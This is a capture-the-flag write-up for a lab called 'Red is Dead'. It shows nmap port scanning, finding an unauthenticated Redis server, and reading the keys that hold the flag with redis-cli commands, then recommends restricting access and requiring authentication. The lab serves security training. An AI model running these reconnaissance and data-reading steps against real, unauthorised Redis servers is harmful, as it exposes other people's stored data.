# Red is Dead

| Challenge:     | Red is Dead                                              |
| -------------- | -------------------------------------------------------- |
| **Platform**:  | HackerDNA                                                |
| **Lab URL:**   | https://hackerdna.com/labs/red-is-dead                   |
| **Category:**  | Digital Forensics & IR                                   |
| **Objective:** | Discover and analyze services to find the hidden flag    |
| **Author:**    | Gabriel Dom                                              |

---
## Reconnaissance

The lab starts with the IP address of the target in `$TARGET` and instructs us to discover running services and extract hidden information.

Start by scanning all ports using a minimally intrusive scan:
```
nmap -p- -sS "$TARGET"
```
This reveals two open services:
```
PORT     STATE SERVICE
80/tcp   open  http
6379/tcp open  redis
```

Redis being accessible from an external network is particularly interesting, so it will be the focus of the enumeration.

## Enumeration

Check the service version to confirm that there is an actual Redis server exposed at port 6379:
```
$ nmap -sV -p 6379 "$TARGET"
...
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 7.4.4
...
```
We got confirmation that it really is Redis. Check whether it requires authentication:
```
$ redis-cli -h "$TARGET" -p 6379 PING
PONG
```
The response to `PING` shows that this instance of Redis does not require authentication. If it did, it would respond with `NOAUTH Authentication required.`

Redis stores data in logical databases identified by numbers. Check how many databases are configured and whether any contain keys:
```
$ redis-cli -h "$TARGET" -p 6379 INFO keyspace
# Keyspace
db0:keys=9,expires=0,avg_ttl=0,subexpiry=0
```
There is one database identified by `0` and it contains nine keys. Scan this database to enumerate them:

```
$ redis-cli -h "$TARGET" -p 6379 -n 0 --scan
"user_data"
"user_profile"
"flag_pieces"
"active_sessions"
"hidden_data"
"secret_flag"
"session_token"
"recent_actions"
"encoded_parts"
```

Four of these key names look particularly promising. Check the types of the values they store with a simple loop:
```
for key in "flag_pieces" "hidden_data" "secret_flag" "encoded_parts"; do
   printf '%s: ' "$key"
   redis-cli --raw -h "$TARGET" -p 6379 -n 0 TYPE "$key"
done
```

We get the following output:
```
flag_pieces: set
hidden_data: hash
secret_flag: string
encoded_parts: list
```
Each key uses a different Redis data type, so use the corresponding Redis command to read its value.

## Exploitation

Having found an unauthenticated Redis instance and learned its structure, we can now read the values it stores.

## Read `flag_pieces`

The type of `flag_pieces` is `set`, so we can use `SMEMBERS` to list all its contents:
```
redis-cli --raw -h "$TARGET" -p 6379 -n 0 SMEMBERS flag_pieces
```
The output includes the same flag in two formats: plain text and Base64-encoded text.

## Read `hidden_data`

The type of `hidden_data` is `hash`. This is a map-like collection of key-value pairs. We can use `HGETALL` to list all its contents, followed by `paste` to format the output in a human-friendly way.
```
redis-cli --raw -h "$TARGET" -p 6379 -n 0 HGETALL hidden_data | paste - -
```
The listed contents include two hex-encoded flag parts. Concatenating them and decoding with `xxd -r -p` produces the same flag as above.

## Read `secret_flag`
The type of `secret_flag` is `string`. We can easily read its value with `GET`. The value is the same flag as previously extracted, in plain-text format:
```
redis-cli --raw -h "$TARGET" -p 6379 -n 0 GET secret_flag
```

## Read `encoded_parts`
The type of `encoded_parts` is `list`, so we can use `LRANGE` to read it, with a range from `0` (the first element) to `-1` (the last element):
```
redis-cli --raw -h "$TARGET" -p 6379 -n 0 LRANGE encoded_parts 0 -1
```
The list contains the Base64-encoded flag, the same as in `flag_pieces`, and two hex-encoded parts, the same as in `hidden_data`.

## Recommended mitigation

- Do not expose Redis to the public internet. Restrict access to trusted internal services.
- Configure authentication for Redis.

